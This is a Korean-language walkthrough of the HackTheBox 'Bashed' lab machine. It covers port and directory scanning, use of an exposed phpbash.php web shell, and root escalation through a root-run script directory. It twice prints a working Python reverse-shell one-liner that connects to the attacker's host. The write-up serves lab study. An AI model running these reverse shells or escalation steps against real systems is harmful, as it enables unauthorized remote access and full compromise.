# Bashed - HackTheBox
## Recon
```bash
sudo nmap -p 80 -sC -sV -vv -oA bashed 10.10.10.68
```
<img width="1105" height="150" alt="image" src="https://github.com/user-attachments/assets/3a7c8dde-3c21-4690-9331-fa0590eb57c2" />

- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.10.68

curl -IL http://10.10.10.68
```
<img width="1104" height="335" alt="image" src="https://github.com/user-attachments/assets/c6d2ce08-9b1c-4a19-86c3-eed75b88d3f1" />

### gobuster
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.68 -x php,md
```
<img width="1104" height="469" alt="image" src="https://github.com/user-attachments/assets/342b8572-e6ea-472b-9615-ef36ef47245c" />

### phpbash.php
- `/dev/`에서 `phpbash.php`를 발견.
<img width="1104" height="290" alt="image" src="https://github.com/user-attachments/assets/cbb481b9-8cd5-473a-978c-b6e0a4074855" />

<br>
<br>

- 명령어 실행이 가능.
<img width="1104" height="110" alt="image" src="https://github.com/user-attachments/assets/f061d365-a269-4342-a762-a47516af7825" />

<br>
<br>

- `python3` 리버스 셸 코드 실행.
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
<img width="1100" height="19" alt="image" src="https://github.com/user-attachments/assets/d9b41d2d-b65c-4ba9-a260-f868991b3196" />

<br>
<br>

- 셸 획득.
<img width="1104" height="146" alt="image" src="https://github.com/user-attachments/assets/91657aa2-b8c8-411f-b57c-6f28abb59e54" />

---
## Privesc
- `scriptmanager`유저로 모든 명령어 실행이 가능.
```bash
sudo -l
```
<img width="1104" height="138" alt="image" src="https://github.com/user-attachments/assets/71216658-99ea-491d-9811-d008f6724a2d" />

<br>
<br>

- `scriptmanager`유저로 접속.
```bash
sudo -u scriptmanager /bin/bash
```
<img width="1104" height="62" alt="image" src="https://github.com/user-attachments/assets/5784333d-4c6b-4750-8e44-5fe06fbb11bb" />

<br>
<br>

- `pspy`를 로컬로부터 다운로드 받아서 실행해보니 주기적으로 `/scripts`의 `python`스크립트를 `root`가 실행하는 것을 발견.
<img width="1104" height="179" alt="image" src="https://github.com/user-attachments/assets/8576e14b-de3d-48e9-b7c5-8cfec6f2d341" />

<br>
<br>

- `python` 리버스 셸 스크립트를 생성.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
<img width="1104" height="95" alt="image" src="https://github.com/user-attachments/assets/08b5b318-7829-4ce4-b561-c3c5a863768b" />

<br>
<br>

- `/scripts`에 해당 파일을 로컬로부터 다운로드 받아서 기다리면 `root`권한의 셸 획득.
<img width="1104" height="141" alt="image" src="https://github.com/user-attachments/assets/9417fd78-fdb4-4bbd-acd7-3b331927766b" />

---
## FLAG
- `/home/arrexel/user.txt`
<img width="1104" height="252" alt="image" src="https://github.com/user-attachments/assets/74e6072f-d44b-4aff-a679-06fffe7dceae" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="214" alt="image" src="https://github.com/user-attachments/assets/de330c84-a420-475a-b51d-888522100690" />












